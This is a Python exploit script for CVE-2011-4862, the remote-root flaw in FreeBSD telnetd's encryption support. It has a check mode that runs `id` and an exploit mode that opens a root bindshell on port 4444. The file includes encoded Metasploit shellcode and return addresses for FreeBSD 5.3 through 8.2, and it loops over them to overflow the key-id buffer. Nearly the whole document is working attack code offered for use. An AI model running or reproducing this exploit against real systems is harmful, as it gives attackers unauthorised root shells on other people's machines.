#!/usr/bin/env python
# Checks/exploits CVE-2011-4862 (remote root in encryption supporting telnetd) in multiple FreeBSD versions.
# Author: Knull of http://leethack.info
# References:
# Metasploit module, http://www.metasploit.com/modules/exploit/freebsd/telnet/telnet_encrypt_keyid
# FreeBSD advisory, http://lists.freebsd.org/pipermail/freebsd-announce/2011-December/001398.html

import random, string, struct, socket, time, sys

def usage():

 print "Usage: " + sys.argv[0] + " [Option] host\n\nOptions: \n     -c\tcheck if telnetd is vulnerable and running as root (runs command `id` on host)\n     -e\texploit host (opens a bindshell on port 4444)\n"

if len(sys.argv) == 3:
 host = sys.argv[2].rstrip()
 port = 23
 if sys.argv[1] == '-c':
  # slightly modified version of metasploits bsd/x86/exec:
  #
  # bsd/x86/exec - 71 bytes
  # http://www.metasploit.com
  # Encoder: x86/shikata_ga_nai
  # AppendExit=false, CMD=id, PrependSetresuid=false, 
  # PrependSetuid=false, VERBOSE=false, PrependSetreuid=false
  buf = "\xda\xd0\xb8\x7b\x91\x45\xc5\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0c\x31\x45\x17\x03\x45\x17\x83\x96\x6d\xa7\x30\x02\xb5\x70\x22\x80\xa1\xad\x37\x24\x32\x27\x50\x76\x5a\x59\xb0\x05\xf2\xcd\xe1\xc6\x60\x67\x77\xfb\x37\x9f\x84\xfb\xb7\x5f\xe2\x9f\xb7\x08\xa7\xd6\x59\xe4\x16\xbb\xc9\xc4\x19"
 elif sys.argv[1] == '-e':
  # slightly modified version of metasploits bsd/x86/shell_bind_tcp:
  #
  # bsd/x86/shell_bind_tcp - 100 bytes
  # http://www.metasploit.com
  # Encoder: x86/shikata_ga_nai
  # AutoRunScript=, AppendExit=false, PrependSetresuid=false, 
  # InitialAutoRunScript=, PrependSetuid=false, LPORT=4444, 
  # VERBOSE=false, RHOST=, PrependSetreuid=false
  buf = "\xda\xc8\xbe\x7b\xd4\xea\x14\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x13\x31\x70\x18\x83\xc0\x04\x03\x70\x6f\x36\x1f\x25\x4f\xe6\x88\xb9\x4d\x16\x15\xcf\xb6\x48\xcf\xce\x52\x6b\x65\xc1\x12\x0a\xb4\x61\x05\x9d\x16\x08\xc1\x45\x5a\x4c\x98\x31\x88\xfd\xf0\x70\xd0\x4e\x1a\x46\x51\xfe\x72\x32\x08\xa7\xbf\x42\x53\x18\xdb\x3a\x5a\xf7\x4b\x92\x8d\x8b\xe3\x84\xfe\x09\x9a\x3a\x88\x2d\x0c\x97\xd9\xe1\x1c\x2c\x13\x81"
 else:
  usage()
  exit()
else:
 usage()
 exit()


socket.setdefaulttimeout(10)
rg = random.SystemRandom()
alnum = string.letters[0:52] + string.digits

def rand_alnumlst(length):
 return list(''.join(rg.choice(alnum) for _ in range(length)))

enc_init = "\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0"
enc_keyid = "\xff\xfa\x26\x07"
end_suboption = "\xff\xf0"

# ret values for multiple FreeBSD versions
rets = 0x0804a8a9, 0x0804a889, 0x0804a869, 0x08057bd0, 0x0804c4e0, 0x0804a5b4, 0x08052925, 0x0804cf31, 0x8059730
version = '8.2', '8.1', '8.0', '7.3/7.4', '7.0/7.1/7.2', '6.3/6.4', '6.0/6.1/6.2', '5.5', '5.3'

# display banner
print "Vulnerability checker/exploit for CVE-2011-4862 (FreeBSD telnetd encryption)"
print "by Knull, http://leethack.info\n"

count = 0
tried = 0

# loop through the ret's until one works
for ret in rets:
 
 key_id = rand_alnumlst(400)
 key_id[0:1] = "\xeb\x76"
 key_id[72:75] = struct.pack('<I', ret - 20)
 key_id[76:79] = struct.pack('<I', ret)
 key_id[80:191] = rand_alnumlst(112)
 key_id[120:121] = "\xeb\x46"
 key_id[192:191+len(buf)] = buf

 s = ''
 for i in key_id:
  s += ''.join(i)

 sploit = enc_keyid + s + end_suboption

 print "Trying FreeBSD " + version[count] + "...\n"

 try:

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((host, port))
  sock.send(enc_init)
  data = sock.recv(32)

  sock.send(sploit)
  data = sock.recv(32)
  time.sleep(0.5)

  if data:

   sock.send(sploit)
   time.sleep(0.5)

   if sys.argv[1] == '-e':
    tried = 1
    sock.close()

   elif sys.argv[1] == '-c':
    result = sock.recv(128)
    sock.close()

    if result.find("root") != -1:
     print host + " is vulnerable, result of command: id\n" + result
     exit()

   sock.close()

 except socket.error:
  pass

 count+=1

if tried:
 print "Sent payloads, check bindshell on " + host + ", port 4444\n"
